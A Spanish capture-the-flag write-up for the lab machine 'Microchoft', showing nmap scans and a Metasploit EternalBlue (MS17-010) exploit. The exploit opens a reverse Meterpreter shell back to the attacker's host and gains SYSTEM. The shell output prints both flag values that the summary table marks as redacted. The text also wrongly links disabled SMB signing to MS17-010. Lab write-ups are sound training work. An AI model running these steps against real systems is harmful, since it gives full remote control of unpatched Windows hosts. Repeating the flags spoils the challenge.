# Writeup — Microchoft (TheHackersLabs)

**Plataforma:** TheHackersLabs  
**Sistema:** Windows 7 Home Basic SP1 (x64)  
**IP:** 10.10.10.6  
**Objetivo:** Obtener user.txt y admin.txt

---

## 1. Descubrimiento de Red

```bash
sudo nmap -sn 10.10.10.0/24
```

Máquina objetivo identificada en `10.10.10.6` (MAC Oracle VirtualBox).

---

## 2. Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.6 -oG all_ports.txt
```

Puertos abiertos: `135,139,445,49152-49157`

```bash
nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sCV -vvv 10.10.10.6 -oN tcp_scan.txt
```

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 SP1 microsoft-ds
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
```

SMB con `message_signing: disabled` — vulnerable a MS17-010.

---

## 3. EternalBlue (MS17-010)

```bash
nmap --script smb-vuln-ms17-010 -p445 10.10.10.6
```

```
Host script results:
| smb-vuln-ms17-010:
|   State: VULNERABLE
|   Risk factor: HIGH
|   IDs: CVE:CVE-2017-0143
```

```bash
sudo msfconsole -q
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.6
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.10.2
msf6 > run
```

```
[+] 10.10.10.6:445 - Host is likely VULNERABLE to MS17-010!
[+] 10.10.10.6:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Meterpreter session 1 opened
[+] =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 4. Flags

```cmd
meterpreter > shell

C:\Users\Lola\Desktop>type user.txt
13e624146d31ea232c850267c2745caa

C:\Users\Admin\Desktop>type admin.txt.txt
ff4ad2daf333183677e02bf8f67d4dca
```

---

## Resumen

| Paso | Técnica | Resultado |
|------|---------|-----------|
| Descubrimiento | `nmap -sn` | IP `10.10.10.6` |
| Escaneo | `nmap -p- -sCV` | SMB en puerto 445, Windows 7 SP1 |
| Explotación | EternalBlue (MS17-010) | SYSTEM |
| Flags | `type` en shell | `user.txt` y `admin.txt` |

**Flags:** `<REDACTED>` / `<REDACTED>`
